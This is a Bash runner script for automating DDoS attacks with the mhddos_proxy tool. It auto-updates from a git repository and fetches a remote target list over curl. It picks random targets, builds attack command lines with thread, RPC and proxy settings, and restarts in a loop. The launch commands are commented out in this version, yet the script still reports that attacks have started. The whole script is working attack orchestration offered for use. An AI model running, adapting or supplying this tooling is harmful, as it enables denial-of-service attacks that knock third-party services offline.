#!/bin/bash

restart_interval=10s

num_of_copies="${1:-2}"


# Цвет текста:
BLACK='\033[0;30m'     #  ${BLACK}    # чёрный цвет знаков
RED='\033[0;31m'       #  ${RED}      # красный цвет знаков
GREEN='\033[0;32m'     #  ${GREEN}    # зелёный цвет знаков
YELLOW='\033[0;33m'     #  ${YELLOW}    # желтый цвет знаков
BLUE='\033[0;34m'       #  ${BLUE}      # синий цвет знаков
MAGENTA='\033[0;35m'     #  ${MAGENTA}    # фиолетовый цвет знаков
CYAN='\033[0;36m'       #  ${CYAN}      # цвет морской волны знаков
GRAY='\033[0;37m'       #  ${GRAY}      # серый цвет знаков

# Цветом текста (жирным) (bold) :
DEF='\033[0;39m'       #  ${DEF}
DGRAY='\033[1;30m'     #  ${DGRAY}
LRED='\033[1;31m'       #  ${LRED}
LGREEN='\033[1;32m'     #  ${LGREEN}
LYELLOW='\033[1;33m'     #  ${LYELLOW}
LBLUE='\033[1;34m'     #  ${LBLUE}
LMAGENTA='\033[1;35m'   #  ${LMAGENTA}
LCYAN='\033[1;36m'     #  ${LCYAN}
WHITE='\033[1;37m'     #  ${WHITE}

# Цвет фона
BGBLACK='\033[40m'     #  ${BGBLACK}
BGRED='\033[41m'       #  ${BGRED}
BGGREEN='\033[42m'     #  ${BGGREEN}
BGBROWN='\033[43m'     #  ${BGBROWN}
BGBLUE='\033[44m'     #  ${BGBLUE}
BGMAGENTA='\033[45m'     #  ${BGMAGENTA}
BGCYAN='\033[46m'     #  ${BGCYAN}
BGGRAY='\033[47m'     #  ${BGGRAY}
BGDEF='\033[49m'      #  ${BGDEF}



# for Docker
#echo "Kill all useless docker-containers with MHDDoS"
#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
#echo "Docker useless containers killed"

threads="${2:-300}"
threads="-t $threads"
rpc="${3:-100}"
rpc="--rpc $rpc"
proxy_interval="300"
proxy_interval="-p $proxy_interval"
debug="${4:-}"




# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
echo -e "\033[0;34m#####################################\033[0;0m\n"
do
	cd ~/auto_mhddos_test
   	num=$(sudo git pull origin main | grep -c "Already")
   	echo "$num"
   	
   	if ((num == 1));
   	then
		echo -e "Running up to date auto_mhddos"
	else
		cd ~/auto_mhddos_test
		clear
		echo "Running updated auto_mhddos"
		bash runner.sh
		exit 130
	fi
	clear
	echo -e "\nRESTARTING\n"
   	#Just in case kill previous copy of mhddos_proxy
   	echo "Killing all old processes with MHDDoS"
   	sudo pkill -f runner.py
   	sudo pkill -f ./start.py
   	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
   	
   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
   
  	echo -e "\nNumber of targets in list: " $list_size "\n"
   	echo -e "\nTaking random targets to reduce the load on your CPU(processor)..."
   	random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   	echo -e "\nRandom number(s): " $random_numbers "\n"
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]")")
           

            echo -e "\nfull cmd:\n"
            echo "$cmd_line $proxy_interval $rpc $threads $debug"
            
            #cd ~/mhddos_proxy
            #sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
            #sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads &debug&
            echo -e "\n\033[42mAttack started successfully\033[0m\n"
   	done
	echo -e "\033[0;34m#####################################\033[0;0m\n"
   	echo -e "\n\033[1;35mDDoS is up and Running, next update of targets list in $restart_interval\033[1;0m"
   	sleep $restart_interval
   	
	no_ddos_sleep=11s #TO DELETE
   	#no_ddos_sleep="$(shuf -i 1-10 -n 1)m"
   	#echo -e "\n\033[46mSleeping $no_ddos_sleep to protect your machine...\033[0m\n"
   	#echo "Kill all useless docker-containers with MHDDoS"
   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
   	#echo "Docker useless containers killed"
done
